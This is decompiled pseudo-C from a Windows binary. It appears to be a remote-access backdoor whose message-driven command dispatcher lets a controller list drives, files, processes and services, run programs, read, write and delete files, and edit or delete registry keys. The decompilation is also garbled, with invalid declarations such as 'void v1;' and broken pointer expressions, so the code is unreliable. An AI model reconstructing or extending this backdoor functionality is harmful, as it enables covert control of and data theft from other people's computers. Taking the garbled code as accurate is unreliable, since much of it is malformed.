	v1 = v6 + 8;
	a1 = v7;
	do
		v8 = *v1++;
	while ( v8 );
	v4 = v1 - (v3 + 1) + *(v2 + 5) + 9;
	v9 = (int)(v2 + 6);
	sub_401170((int)(v2 + 6), (int)&a1, 4u);
	sub_401170(v9, v3, strlen((const char *)v3) + 1);
	sub_401170(v9, v4, strlen((const char *)v4) + 1);
	if ( !*v3 )
	{
		phkResult = a1;
		return -(RegDeleteValueA(&phkResult , (char *)v4) != 0) & 2;
	}
	if ( !RegOpenKeyExA(&a1 , (char *)v3, 0, 2u, &phkResult) )
		return -(RegDeleteValueA(&phkResult , (char *)v4) != 0) & 2;
	return 1;
}

//----- (00401DD0) --------------------------------------------------------
int  sub_401DD0(int a1)
{
	void v1; 
	void *v2; 
	void *v3; 
	int result; 
	int v5; 
	void *v6; 
	int v7; 
	int v8; 
	int v9; 
	void v10; 
	void *v11; 
	void *v12; 
	void *v13; 
	int v14; 
	int v15; 
	int v16; 
	int v17; 
	void v18; 
	void *v19; 
	void *v20; 
	char v21; 
	char v22; 
	char v23; 
	char v24; 
	char v25; 
	void *Memory; 
	char v27[5]; 
	void ResumeHandle; 
	void v29; 
	void Size; 
	void ServicesReturned; 
	int v32; 
	void *v33; 

	v3 = 0;
	Memory = 0;
	*&v27[1] = 0;
	ResumeHandle = 0;
	v1 = OpenSCManagerA(0, 0, 4u);
	v2 = v1;
	v29 = v1;
	if ( v1 )
	{
		if ( EnumServicesStatusA(v1, 0x30u, 3u, 0, *(void *)&v27[1], &Size, &ServicesReturned, &ResumeHandle) )
		{
			v5 = 3;
		}
		else
		{
			v19 = malloc(Size);
			v6 = v19;
			Memory = v19;
			if ( v19 )
			{
				while ( 1 )
				{
					*&v27[1] = Size;
					if ( EnumServicesStatusA(
								v2,
								0x30u,
								3u,
								(void)v6,
								Size,
								&Size,
								&ServicesReturned,
								&ResumeHandle) )
						break;
					if ( Size <= *&v27[1] )
					{
						v5 = 5;
						goto LABEL_41;
					}
					free(v6);
					v20 = malloc(Size);
					Memory = v20;
					if ( !v20 )
						goto LABEL_11;
					v6 = Memory;
				}
				v7 = a1 + 24;
				sub_401170(a1 + 24, (int)&ServicesReturned, 4u);
				v32 = 0;
				if ( ServicesReturned > 0 )
				{
					v33 = v6;
					do
					{
						v8 = *(v6 + 1);
						do
							v21 = *v8++;
						while ( v21 );
						sub_401170(v7, *(v6 + 1), v8 - (*(v6 + 1) + 1) + 1);
						v9 = *v6;
						do
							v22 = *v9++;
						while ( v22 );
						sub_401170(v7, *v6, v9 - (*v6 + 1) + 1);
						sub_401170(v7, (int)((char *)v6 + 12), 4u);
						v27[0] = 0;
						v12 = 0;
						v10 = OpenServiceA(v2, *(char * *)v6, 1u);
						v11 = v10;
						if ( v10 )
						{
							*&v27[1] = 0;
							if ( !QueryServiceConfigA(v10, 0, 0, (void *)&v27[1]) )
							{
								if ( GetLastError() == 122 )
								{
									v13 = malloc(*(void *)&v27[1]);
									v12 = v13;
									if ( v13 )
									{
										if ( QueryServiceConfigA(v11, (void)v13, *(void *)&v27[1], (void *)&v27[1]) )
											v27[0] = 1;
									}
								}
							}
						}
						sub_401170(v7, (int)v27, 1u);
						if ( (char)v27 )
						{
							sub_401170(v7, (int)((char *)v12 + 4), 4u);
							v14 = *(v12 + 3);
							do
								v23 = *v14++;
							while ( v23 );
							sub_401170(v7, *(v12 + 3), v14 - (*(v12 + 3) + 1) + 1);
							v15 = *(v12 + 7);
							if ( v15 )
							{
								v16 = *(v12 + 7);
								do
									v24 = *v16++;
								while ( v24 );
								v18 = v16 - (v15 + 1) + 1;
								v17 = *(v12 + 7);
							}
							else
							{
								v18 = 12;
								v17 = (int)"LocalSystem";
							}
							sub_401170(v7, v17, v18);
							v6 = v33;
						}
						if ( v11 )
							CloseServiceHandle(v11);
						if ( v12 )
							free(v12);
						v2 = v29;
						v6 = (char *)v6 + 36;
						v25 = v32++ + 1 < ServicesReturned;
						v33 = v6;
					}
					while ( v25 );
					v3 = 0;
				}
				v5 = 0;
			}
			else
			{
LABEL_11:
				v5 = 4;
			}
		}
LABEL_41:
		CloseServiceHandle(v2);
		if ( Memory != v3 )
			free(Memory);
		result = v5;
	}
	else
	{
		result = 2;
	}
	return result;
}

//----- (00402050) --------------------------------------------------------
int  sub_402050(int a1)
{
	int v1; 
	int v2; 
	int v3; 
	void v4; 
	void v5; 
	int v6; 
	int v8; 
	char v9; 
	void *v10; 
	int v11; 
	void phkResult; 
	char v13[5]; 
	char ValueName; 
	struct _void ftLastWriteTime; 
	void Size; 
	void Type; 

	v8 = *(a1 + 20);
	v2 = v8 + 8;
	v3 = a1 + 24;
	v11 = *(v8 + 4);
	sub_401170(a1 + 24, (int)&v11, 4u);
	v1 = v2;
	do
		v9 = *v1++;
	while ( v9 );
	sub_401170(v3, v2, v1 - (v2 + 1) + 1);
	if ( *v2 )
	{
		if ( RegOpenKeyExA((void)&v11 , (char *)v2, 0, 0x20019u, &phkResult) )
			return 1;
	}
	else
	{
		phkResult = (void)v11;
	}
	v4 = 0;
	for ( *&v13[1] = 256; !RegEnumKeyExA(phkResult, v4, &ValueName, (void *)&v13[1], 0, 0, 0, &ftLastWriteTime); *&v13[1] = 256 )
	{
		sub_401170(v3, (int)&ValueName, *&v13[1] + 1);
		++v4;
	}
	v13[0] = 0;
	sub_401170(v3, (int)v13, 1u);
	v5 = 0;
	*&v13[1] = 256;
	v10 = malloc(0x3E80u);
	v6 = (int)v10;
	Size = 16000;
	if ( !RegEnumValueA(phkResult, 0, &ValueName, (void *)&v13[1], 0, &Type, (void)v10, &Size) )
	{
		do
		{
			sub_401170(v3, (int)&ValueName, *&v13[1] + 1);
			sub_401170(v3, (int)&Type, 4u);
			sub_401170(v3, (int)&Size, 4u);
			sub_401170(v3, v6, Size);
			++v5;
			Size = 16000;
			*&v13[1] = 256;
		}
		while ( !RegEnumValueA(phkResult, v5, &ValueName, (void *)&v13[1], 0, &Type, (void)v6, &Size) );
	}
	sub_401170(v3, (int)v13, 1u);
	return 0;
}

//----- (00402220) --------------------------------------------------------
int  sub_402220(int a1)
{
	int v2; 

	v2 = 100;
	sub_401170(a1 + 24, (int)&v2, 4u);
	return 0;
}

//----- (00402240) --------------------------------------------------------
int  sub_402240(int a1)
{
	int v1; 
	int v2; 
	int v3; 
	int v4; 
	int *v6; 
	int v7; 
	char Buffer; 

	v2 = a1;
	v6 = *(int **)(a1 + 20);
	v7 = 0;
	v3 = *v6;
	v1 = sub_401870(*v6, (int)&v7, &Buffer);
	if ( !v1 )
	{
		v4 = v2 + 24;
		do
		{
			sub_401170(v4, (int)&Buffer, 0x18u);
			v1 = sub_401870(v3, (int)&v7, &Buffer);
		}
		while ( !v1 );
	}
	return ((v1 == 11) - 1) & v1;
}

//----- (004022B0) --------------------------------------------------------
int  sub_4022B0(int a1)
{
	const char *v1; 
	int result; 
	struct _SHvoidOPSTRUCTA FileOp; 

	v1 = (const char *)(*(a1 + 20) + 4);
	if ( SetCurrentDirectoryA((char *)(*(a1 + 20) + 4)) )
	{
		FileOp.hwnd = 0;
		FileOp.wFunc = 3;
		FileOp.pFrom = &v1[strlen(v1) + 1];
		FileOp.pTo = 0;
		FileOp.fFlags = 1044;
		result = SHFileOperationA(&FileOp);
	}
	else
	{
		result = 1;
	}
	return result;
}

//----- (00402320) --------------------------------------------------------
void  sub_402320(int a1)
{
	void *v1; 
	int v2; 
	int v3; 
	void *v4; 

	v1 = dword_40D2F4;
	if ( dword_40D2F4 )
	{
		v2 = a1;
		do
		{
			v3 = *(v1 + 2);
			if ( *(char *)(v3 + 6) == v2 )
			{
				v4 = v1;
				v1 = *(void **)v1;
				sub_4010A0((int)&unk_40D2F0, v4);
				CloseHandle(*(void *)&v3 );
				j__free((void *)v3);
			}
			else
			{
				v1 = *(void **)v1;
			}
		}
		while ( v1 );
	}
}

//----- (00402380) --------------------------------------------------------
int  sub_402380(int a1)
{
	int v1; 
	const char *v2; 
	int v3; 
	const char *v4; 
	int v5; 
	int v6; 
	char v8; 
	int v9; 
	char v10; 
	char v11; 
	void v12; 

	v2 = (const char *)(*(a1 + 20) + 4);
	v1 = *(a1 + 20) + 4;
	do
		v8 = *v1++;
	while ( v8 );
	v9 = v1 - (*(a1 + 20) + 5);
	v4 = &v2[v9 + 1];
	v3 = (int)&v2[v9 + 1];
	do
		v10 = *v3++;
	while ( v10 );
	v6 = v3 - (void)(v4 + 1);
	v5 = *(a1 + 20) + 4;
	do
		v11 = *v5++;
	while ( v11 );
	sub_401170(a1 + 24, *(a1 + 20) + 4, v5 - (*(a1 + 20) + 5) + 1);
	v12 = ShellExecuteA(0, "open", &v2 , &v4[v6 + 1], v4, 0);
	return (unsigned int)v12 & -((unsigned int)v12 <= 0x20);
}

//----- (00402400) --------------------------------------------------------
int  sub_402400(int a1, int a2)
{
	int v2; 
	int v3; 
	int result; 

	v2 = dword_40D2E8;
	if ( dword_40D2E8 )
	{
		while ( 1 )
		{
			v3 = *(v2 + 8);
			if ( *(char *)(v3 + 12) == *(char *)(*(a1 + 20) + 4) )
			{
				if ( *(char *)(v3 + 14) == a2 )
					break;
			}
			v2 = *v2;
			if ( !v2 )
				goto LABEL_5;
		}
		PostThreadMessageA(*(v3 + 8), 0x12u, 0, 0);
		result = 0;
	}
	else
	{
LABEL_5:
		result = 1;
	}
	return result;
}

//----- (00402450) --------------------------------------------------------
int  sub_402450(int a1)
{
	int v1; 
	char *v2; 
	char v4; 
	char v5; 
	void v6; 
	const char DirectoryName; 
	char v8; 
	char v9; 
	int v10; 
	int v11; 
	int v12; 
	char FileSystemNameBuffer; 
	int TotalNumberOfFreeBytes; 
	int TotalNumberOfBytes; 
	int FreeBytesAvailableToCaller; 
	char v17[3]; 

	v1 = a1;
	v6 = GetLogicalDrives();
	DirectoryName = 65;
	v8 = 58;
	v9 = 0;
	v10 = 1;
	v11 = 32;
	do
	{
		if ( v6 & v10 )
		{
			sub_401170(v1 + 24, (int)&DirectoryName, 3u);
			v12 = GetDriveTypeA(&DirectoryName);
			sub_401170(v1 + 24, (int)&v12, 4u);
			FileSystemNameBuffer = 0;
			TotalNumberOfFreeBytes = 064;
			TotalNumberOfBytes = 064;
			FreeBytesAvailableToCaller = 064;
			if ( v12 == 3 )
			{
				if ( !GetVolumeInformationA(&DirectoryName, 0, 0, 0, 0, 0, &FileSystemNameBuffer, 0x33u) )
					FileSystemNameBuffer = 0;
				GetDiskFreeSpaceExA(&DirectoryName, &FreeBytesAvailableToCaller, &TotalNumberOfBytes, &TotalNumberOfFreeBytes);
			}
			v2 = &FileSystemNameBuffer;
			do
				v4 = *v2++;
			while ( v4 );
			sub_401170(v1 + 24, (int)&FileSystemNameBuffer, v2 - v17 + 1);
			sub_401170(v1 + 24, (int)&FreeBytesAvailableToCaller, 8u);
			sub_401170(v1 + 24, (int)&TotalNumberOfBytes, 8u);
			sub_401170(v1 + 24, (int)&TotalNumberOfFreeBytes, 8u);
		}
		v5 = v11 == 1;
		v10 *= 2;
		++DirectoryName;
		--v11;
	}
	while ( !v5 );
	return 0;
}

//----- (004025A0) --------------------------------------------------------
void  sub_4025A0(int a1)
{
	int v1; 
	int v2; 
	int v3; 
	const char *v4; 
	int v5; 
	int v6; 
	void result; 
	char v8; 
	int v9; 
	char *v10; 
	char *v11; 
	char v12; 
	int v13; 
	char *v14; 
	char *v15; 
	char *v16; 
	char *v17; 
	void v18; 
	struct _WIN32_FIND_DATAA *v19; 
	char v20; 
	void *v21; 
	const char v22; 
	char v23; 
	void v24; 
	int v25; 
	char v26; 
	char v27; 
	struct _WIN32_FIND_DATAA FindFileData; 
	void hFindFile; 

	v2 = *(a1 + 20) + 4;
	v1 = *(a1 + 20) + 4;
	do
		v20 = *v1++;
	while ( v20 );
	v3 = a1 + 24;
	sub_401170(a1 + 24, v2, v1 - (*(a1 + 20) + 5) + 1);
	v21 = malloc(strlen((const char *)v2) + 5);
	v4 = (const char *)v21;
	if ( !v21 )
		goto LABEL_29;
	v5 = v2;
	do
	{
		v22 = *v5;
		*(&v4[v5] - v2) = *v5;
		++v5;
	}
	while ( v22 );
	v6 = (int)(v4 - 1);
	do
		v23 = *(v6++ + 1);
	while ( v23 );
	*(char *)v6 = word_40B22C;
	*(v6 + 2) = byte_40B22E;
	v24 = FindFirstFileA(&v4 , &FindFileData);
	v25 = ( int)v24;
	hFindFile = v24;
	free((void *)v4);
	if ( v25 != -1 )
	{
		do
		{
			v10 = L".";
			v11 = FindFileData.cFileName;
			v9 = 2;
			v8 = 1;
			do
			{
				if ( !v9 )
					break;
				v8 = *v11++ == *v10;
				v10 = (char *)((char *)v10 + 1);
				--v9;
			}
			while ( v8 );
			if ( v8 )
				goto LABEL_30;
			v14 = "..";
			v15 = FindFileData.cFileName;
			v13 = 3;
			v12 = 1;
			do
			{
				if ( !v13 )
					break;
				v12 = *v15++ == *v14++;
				--v13;
			}
			while ( v12 );
			if ( v12 )
			{
LABEL_30:
				v19 = &FindFileData;
				v18 = hFindFile;
			}
			else
			{
				v16 = FindFileData.cFileName;
				do
					v26 = *v16++;
				while ( v26 );
				sub_401170(v3, (int)FindFileData.cFileName, v16 - &FindFileData.cFileName[1] + 1);
				v17 = FindFileData.cAlternateFileName;
				do
					v27 = *v17++;
				while ( v27 );
				sub_401170(v3, (int)FindFileData.cAlternateFileName, v17 - &FindFileData.cAlternateFileName[1] + 1);
				sub_401170(v3, (int)&FindFileData, 4u);
				sub_401170(v3, (int)&FindFileData.ftCreationTime, 8u);
				sub_401170(v3, (int)&FindFileData.ftLastAccessTime, 8u);
				sub_401170(v3, (int)&FindFileData.ftLastWriteTime, 8u);
				sub_401170(v3, (int)&FindFileData.nFileSizeHigh, 4u);
				sub_401170(v3, (int)&FindFileData.nFileSizeLow, 4u);
				v19 = &FindFileData;
				v18 = hFindFile;
			}
			result = FindNextFileA(&v18 , v19);
		}
		while ( result );
	}
	else
	{
LABEL_29:
		result = 1;
	}
	return result;
}

//----- (00402760) --------------------------------------------------------
int  StartAddress(void a1)
{
	int v1; 
	int v2; 
	int v3; 
	int v4; 
	int v5; 
	int v6; 
	int v8; 
	struct tagMSG Msg; 
	int v10; 
	void Size; 
	int v12; 
	int v13; 
	int v14; 

	v1 = (int)a1;
	while ( !PeekMessageA(&Msg, 0, 0, 0, 1u) )
	{
		v2 = sub_403F10(*(char *)(v1 + 14));
		if ( !v2 )
			break;
		if ( (unsigned int)sub_401020(v2 + 60) <= 5 )
		{
			if ( !ReadFile(*(void *)(&v1  + 4), &v10, 0x1194u, (void)&Size, 0) )
				break;
			v3 =  new(0x14u);
			v12 = v3;
			v13 = 0;
			if ( !v3 )
				v4 = 0;
			else
				v4 = sub_401390(v3);
			v13 = -1;
			if ( Size )
			{
				v14 = 11;
				sub_401170(v4, (int)&v14, 2u);
				sub_401170(v4, v1 + 12, 2u);
				v6 = Size;
				v5 = (int)&v10;
			}
			else
			{
				v14 = 10;
				sub_401170(v4, (int)&v14, 2u);
				v6 = 2;
				v5 = v1 + 12;
			}
			sub_401170(v4, v5, v6);
			sub_401340(v4);
			PostThreadMessageA(idThread, 0x465u, v4, *(char *)(v1 + 14));
			if ( !Size )
				break;
		}
		Sleep(0x1F4u);
	}
	CloseHandle(*(void *)(&v1  + 4));
	v8 = sub_401150((int)&unk_40D2E4, v1);
	sub_4010A0((int)&unk_40D2E4, (void *)v8);
	j__free((void *)v1);
	return 0;
}

//----- (00402920) --------------------------------------------------------
int  sub_402920(int a1, int a2)
{
	int v2; 
	int v3; 
	int v4; 
	void v5; 
	void v6; 
	int result; 
	int v8; 
	int v9; 
	char v10; 
	int v11; 
	int v12; 
	void v13; 
	int v14; 
	void *v15; 
	void FileSizeHigh; 
	int v17; 
	void ThreadId; 

	v8 = *(a1 + 20);
	v3 = v8 + 6;
	v4 = a1 + 24;
	v9 = a1 + 24;
	a1 = *(char *)(v8 + 4);
	sub_401170(v9, (int)&a1, 2u);
	v2 = v3;
	do
		v10 = *v2++;
	while ( v10 );
	sub_401170(v4, v3, v2 - (v3 + 1) + 1);
	v5 = CreateFileA((char *)&v3 , 1u, 1u, 0, 3u, 0x80u, 0);
	v6 = v5;
	if ( v5 == (void)-1 )
	{
		result = 1;
	}
	else
	{
		v17 = GetFileSize(&v5 , &FileSizeHigh);
		sub_401170(v4, (int)&v17, 4u);
		sub_401170(v4, (int)&FileSizeHigh, 4u);
		v11 =  new(0x10u);
		v12 = v11;
		v13 = CreateThread(0, 0, (void ( *)(void))StartAddress, (void)v11, 4u, &ThreadId);
		v14 = a2;
		v15 = v13;
		*(v12 + 8) = ThreadId;
		*(v12 + 4) = v6;
		*v12 = v13;
		(v13) = a1;
		*(char *)(v12 + 14) = v14;
		*(char *)(v12 + 12) = (char)v13;
		sub_401040((int)&unk_40D2E4, v12);
		ResumeThread(v15);
		result = 0;
	}
	return result;
}

//----- (00402A20) --------------------------------------------------------
int  sub_402A20(int a1)
{
	int v1; 
	void v3; 
	void v4; 
	void v5; 
	void v6; 
	void v7; 
	int v8; 
	unsigned int v9; 
	int v10; 
	void v11; 
	void v12; 
	int *v13; 
	int v14; 
	void v15; 
	void v16; 
	void v17; 
	void v18; 
	void v19; 
	int v20; 
	int v21; 
	int *v22; 
	void v23; 
	unsigned int v24; 
	char v25; 
	void v26; 
	char v27; 
	int v28; 
	struct _OSVERSIONINFOA VersionInformation; 
	int v30; 
	void hLibModule; 
	void v32; 
	void v33; 
	void Size; 
	int v35; 
	unsigned int v36; 
	int v37; 
	int v38; 
	int v39; 
	int v40; 
	int v41; 
	int v42; 
	char v43[260]; 
	int v44; 

	v28 = a1 + 24;
	v1 = 0;
	VersionInformation.dwOSVersionInfoSize = 148;
	if ( !GetVersionExA(&VersionInformation) )
		return 1;
	v30 = 1;
	if ( VersionInformation.dwPlatformId != 2 )
	{
		if ( VersionInformation.dwPlatformId != 1 )
			return 1;
LABEL_36:
		v15 = LoadLibraryA("Kernel32.DLL");
		v16 = v15;
		hLibModule = v15;
		if ( v15 )
		{
			v19 = GetProcAddress(&v15 , "CreateToolhelp32Snapshot");
			v18 = GetProcAddress(&v16 , "Process32First");
			v26 = GetProcAddress(&v16 , "Process32Next");
			v17 = v26;
			if ( v26 )
			{
				if ( v18 )
				{
					if ( v19 )
					{
						v20 = ((int ( *)( int, void))v19)(2, 0);
						v21 = v20;
						if ( v20 != -1 )
						{
							v41 = 296;
							if ( ((int ( *)(int,  int *))v18)(v20, &v41) )
							{
								v30 = 0;
								do
								{
									sub_401170(v28, (int)&v42, 4u);
									v22 = (int *)v43;
									do
									{
										v27 = *v22;
										v22 = (int *)((char *)v22 + 1);
									}
									while ( v27 );
									sub_401170(v28, (int)v43, (char *)v22 - &v43[1] + 1);
									v41 = 296;
								}
								while ( ((int ( *)(int,  int *))v17)(v21, &v41) );
							}
						}
					}
				}
			}
			FreeLibrary(hLibModule);
		}
LABEL_47:
		v44 = -1;
		sub_401170(v28, (int)&v44, 4u);
		return v30;
	}
	if ( VersionInformation.dwMajorVersion == 4 )
	{
		v3 = LoadLibraryA("PSAPI.DLL");
		v4 = v3;
		hLibModule = v3;
		if ( v3 )
		{
			v7 = GetProcAddress(&v3 , "EnumProcesses");
			v23 = GetProcAddress(&v4 , "EnumProcessModules");
			v6 = v23;
			v32 = v23;
			v5 = GetProcAddress(&hLibModule , "GetModuleBaseNameA");
			v33 = v5;
			if ( v7 && v6 && v5 )
			{
				Size = 1024;
				while ( 1 )
				{
					if ( v1 )
						free((void *)v1);
					v8 = (int)malloc(Size);
					v35 = v8;
					if ( !v8 )
						break;
					if ( !((int ( *)(int, void, unsigned int *))v7)(v8, Size, &v36) )
						break;
					if ( v36 != Size )
					{
						v24 = v36 >> 2;
						v9 = 0;
						v36 >>= 2;
						if ( v24 )
						{
							v10 = v35;
							v30 = 0;
							do
							{
								v37 = dword_40B2AC;
								v38 = dword_40B2B0;
								v39 = word_40B2B4;
								v11 = (void)OpenProcess(0x410u, 0, *v10);
								v12 = (void)v11;
								if ( v11 )
								{
									v37 = dword_40B2A0;
									v38 = dword_40B2A4;
									v39 = word_40B2A8;
								}
								else
								{
									v12 = OpenProcess(0x40u, v11, *v10);
								}
								if ( v12 )
								{
									v37 = dword_40B294;
									v38 = dword_40B298;
									v39 = word_40B29C;
								}
								else
								{
									v12 = OpenProcess(0x400u, (void)v12, *v10);
								}
								if ( v12 )
								{
									v37 = dword_40B288;
									v38 = dword_40B28C;
									v39 = word_40B290;
									if ( ((int ( *)(void, int *,  int, void *))v32)(v12, &v40, 4, &Size) )
									{
										if ( !((int ( *)(void, int, int *,  int))v33)(v12, v40, &v37, 260) )
										{
											v37 = dword_40B27C;
											v38 = dword_40B280;
											v39 = word_40B284;
										}
									}
									CloseHandle(&v12 );
								}
								v14 = v28;
								sub_401170(v28, v10, 4u);
								v13 = &v37;
								do
								{
									v25 = *v13;
									v13 = (int *)((char *)v13 + 1);
								}
								while ( v25 );
								sub_401170(v14, (int)&v37, (char *)v13 - ((char *)&v37 + 1) + 1);
								++v9;
								v10 += 4;
							}
							while ( v9 < v36 );
						}
						break;
					}
					v1 = v35;
				}
				v1 = v35;
			}
			FreeLibrary(hLibModule);
			if ( v1 )
				free((void *)v1);
		}
		goto LABEL_47;
	}
	if ( VersionInformation.dwMajorVersion > 4 )
		goto LABEL_36;
	return 1;
}

//----- (00402E00) --------------------------------------------------------
void  sub_402E00(void hKey)
{
	int v1; 
	void v2; 
	int v3; 
	int v4; 
	void result; 
	int v6; 
	void v7; 
	char v8; 
	int v9; 
	void phkResult; 

	v2 = hKey;
	v6 = *(hKey + 5);
	v7 = *(void *)(v6 + 4);
	v3 = v6 + 8;
	v1 = v6 + 8;
	hKey = v7;
	do
		v8 = *v1++;
	while ( v8 );
	v4 = v1 - (v3 + 1) + *(v2 + 5) + 9;
	v9 = (int)(v2 + 6);
	sub_401170((int)(v2 + 6), (int)&hKey, 4u);
	sub_401170(v9, v3, strlen((const char *)v3) + 1);
	sub_401170(v9, v4, strlen((const char *)v4) + 1);
	if ( RegOpenKeyExA(&hKey , (char *)v3, 0, 0x2000Eu, &phkResult) )
		result = 1;
	else
		result = sub_401C10(phkResult, (char *)v4) != 0;
	return result;
}

//----- (00402EC0) --------------------------------------------------------
int  sub_402EC0(int a1, int a2)
{
	void *v2; 
	int v3; 
	int result; 
	int v5; 
	int v6; 
	int v7; 

	v6 = a1 + 24;
	a1 = *(char *)(*(a1 + 20) + 4);
	sub_401170(v6, (int)&a1, 2u);
	v2 = dword_40D2F4;
	if ( !dword_40D2F4 )
		goto LABEL_11;
	while ( 1 )
	{
		v3 = *(v2 + 2);
		if ( *(char *)(v3 + 4) == (char)a1 )
		{
			if ( *(char *)(v3 + 6) == a2 )
				break;
		}
		v2 = *(void **)v2;
		if ( !v2 )
			return 1;
	}
	v5 = *(v2 + 2);
	if ( v5 )
	{
		CloseHandle(*(void *)&v5 );
		v7 = sub_401150((int)&unk_40D2F0, v5);
		sub_4010A0((int)&unk_40D2F0, (void *)v7);
		j__free((void *)v5);
		result = 0;
	}
	else
	{
LABEL_11:
		result = 1;
	}
	return result;
}

//----- (00402F50) --------------------------------------------------------
int  sub_402F50(void a1, int a2)
{
	void *v2; 
	int v3; 
	const void *v4; 
	void v5; 
	int v6; 
	int v7; 
	int result; 
	int v9; 
	int v10; 
	int v11; 
	int v12; 
	int v13; 
	int v14; 
	int v15; 
	void NumberOfBytesWritten; 

	v9 = *(a1 + 20);
	v14 = *(char *)(v9 + 2);
	v10 = *(a1 + 16);
	v4 = (const void *)(v9 + 6);
	v3 = a1 + 24;
	v15 = *(char *)(v9 + 4);
	v5 = v10 - 6;
	sub_401170(a1 + 24, (int)&v15, 2u);
	v2 = dword_40D2F4;
	if ( !dword_40D2F4 )
		goto LABEL_7;
	while ( 1 )
	{
		v6 = *(v2 + 2);
		if ( *(char *)(v6 + 4) == (char)v15 )
		{
			if ( *(char *)(v6 + 6) == a2 )
				break;
		}
		v2 = *(void **)v2;
		if ( !v2 )
			goto LABEL_7;
	}
	v7 = *(v2 + 2);
	if ( v7 )
	{
		if ( WriteFile(*(void *)&v7 , v4, v5, &NumberOfBytesWritten, 0) )
		{
			if ( NumberOfBytesWritten == v5 )
			{
				if ( v14 == 8 )
				{
					CloseHandle(*(void *)&v7 );
					v13 = sub_401150((int)&unk_40D2F0, v7);
					sub_4010A0((int)&unk_40D2F0, (void *)v13);
					j__free((void *)v7);
				}
				result = 0;
			}
			else
			{
				a1 = GetLastError();
				sub_401170(v3, (int)&a1, 4u);
				CloseHandle(*(void *)&v7 );
				v12 = sub_401150((int)&unk_40D2F0, v7);
				sub_4010A0((int)&unk_40D2F0, (void *)v12);
				j__free((void *)v7);
				result = 3;
			}
		}
		else
		{
			a1 = GetLastError();
			sub_401170(v3, (int)&a1, 4u);
			CloseHandle(*(void *)&v7 );
			v11 = sub_401150((int)&unk_40D2F0, v7);
			sub_4010A0((int)&unk_40D2F0, (void *)v11);
			j__free((void *)v7);
			result = 2;
		}
	}
	else
	{
LABEL_7:
		a1 = 0;
		sub_401170(v3, (int)&a1, 4u);
		result = 1;
	}
	return result;
}

//----- (004030E0) --------------------------------------------------------
int  sub_4030E0(int a1, int a2)
{
	void *v2; 
	const char *v3; 
	int v4; 
	int v5; 
	int v6; 
	void *v7; 
	int result; 
	int v9; 
	int v10; 
	int v11; 
	void v12; 
	int v13; 

	v9 = *(a1 + 20);
	v3 = (const char *)(v9 + 6);
	v5 = a1 + 24;
	v10 = a1 + 24;
	a1 = *(char *)(v9 + 4);
	sub_401170(v10, (int)&a1, 2u);
	v2 = dword_40D2F4;
	v4 = a2;
	if ( !dword_40D2F4 )
		goto LABEL_5;
	while ( 1 )
	{
		v6 = *(v2 + 2);
		if ( *(char *)(v6 + 4) == (char)a1 )
		{
			if ( *(char *)(v6 + 6) == a2 )
				break;
		}
		v2 = *(void **)v2;
		if ( !v2 )
			goto LABEL_5;
	}
	if ( *(v2 + 2) )
	{
		v13 = 0;
		sub_401170(v5, (int)&v13, 4u);
		result = 1;
	}
	else
	{
LABEL_5:
		v11 =  new(8u);
		v7 = (void *)v11;
		*(char *)(v11 + 6) = v4;
		*(char *)(v11 + 4) = a1;
		v12 = CreateFileA(&v3 , 2u, 0, 0, 2u, 0, 0);
		*v7 = v12;
		if ( v12 == (void)-1 )
		{
			v13 = GetLastError();
			sub_401170(v5, (int)&v13, 4u);
			j__free(v7);
			result = 2;
		}
		else
		{
			sub_401040((int)&unk_40D2F0, (int)v7);
			result = 0;
		}
	}
	return result;
}

//----- (004031D0) --------------------------------------------------------
void  sub_4031D0(void hKey, int a2)
{
	void v2; 
	unsigned int v3; 
	unsigned int v4; 
	int v5; 
	void result; 
	int v7; 
	int v8; 
	int v9; 

	v4 = (unsigned int)hKey;
	sub_401340((int)(hKey + 1));
	v7 = *(v4 + 20);
	v8 = *(char *)v7;
	v3 = *(char *)(v7 + 2);
	v9 = *(v4 + 20);
	hKey = 0;
	sub_401170(v4 + 24, v9, 4u);
	sub_401170(v4 + 24, (int)&hKey, 4u);
	switch ( v8 )
	{
		case 1:
			switch ( v3 )
			{
				case 1u:
					v5 = sub_402450(v4);
					goto LABEL_29;
				case 2u:
					v5 = sub_4025A0(v4);
					goto LABEL_29;
				case 5u:
					v5 = sub_402380(v4);
					goto LABEL_29;
				case 4u:
					v5 = sub_402920(v4, *(char *)(a2 + 100));
					goto LABEL_29;
				case 0xCu:
					v5 = sub_402400(v4, *(char *)(a2 + 100));
					goto LABEL_29;
				case 9u:
					v5 = sub_4022B0(v4);
					goto LABEL_29;
				case 6u:
					v5 = sub_4030E0(v4, *(char *)(a2 + 100));
					goto LABEL_29;
				case 7u:
				case 8u:
					v5 = sub_402F50(v4, *(char *)(a2 + 100));
					goto LABEL_29;
				case 0xDu:
					v5 = sub_402EC0(v4, *(char *)(a2 + 100));
					goto LABEL_29;
				case 0xEu:
					v5 = sub_4019E0(v4);
					goto LABEL_29;
				default:
					goto LABEL_30;
			}
		case 2:
			switch ( v3 )
			{
				case 0x64u:
					v5 = sub_402050(v4);
					goto LABEL_29;
				case 0x66u:
					v5 = sub_401D10((void)v4);
					goto LABEL_29;
				case 0x65u:
					v5 = sub_401A40((void)v4);
					goto LABEL_29;
				case 0x67u:
					v5 = sub_401AF0((void)v4);
					goto LABEL_29;
				case 0x68u:
					v5 = sub_402E00((void)v4);
					goto LABEL_29;
				default:
					goto LABEL_30;
			}
		case 3:
			if ( v3 == 200 )
			{
				v5 = sub_402A20(v4);
				goto LABEL_29;
			}
			if ( v3 == 201 )
			{
				v5 = sub_401B80(v2, v4);
				goto LABEL_29;
			}
			break;
		case 4:
			if ( v3 == 400 )
			{
				v5 = sub_401DD0(v4);
				goto LABEL_29;
			}
			break;
		case 5:
			if ( v3 == 303 )
			{
				v5 = sub_402220(v4);
				goto LABEL_29;
			}
			break;
		case 6:
			if ( v3 == 500 )
			{
				v5 = sub_402240(v4);
LABEL_29:
				hKey = (void)v5;
			}
			break;
		default:
			break;
	}
LABEL_30:
	sub_401340(v4 + 24);
	*(*(v4 + 40) + 4) = hKey;
	result = hKey;
	*(v4 + 48) = 1;
	return result;
}

//----- (00403400) --------------------------------------------------------
int  sub_403400(void a1)
{
	struct tagMSG Msg; 

	while ( GetMessageA(&Msg, 0, 0, 0) )
	{
		if ( Msg.message == 1124 )
			sub_4031D0((void)Msg.wParam, Msg.lParam);
	}
	return 0;
}

//----- (00403460) --------------------------------------------------------
void  sub_403460(void a1)
{
	void result; 
	void v2; 
	void ThreadId; 

	ThreadId = a1;
	result = CreateThread(0, 0, (void ( *)(void))sub_403400, 0, 0, &ThreadId);
	v2 = result;
	if ( result )
	{
		sub_403CE0(ThreadId);
		result = v2;
	}
	return result;
}

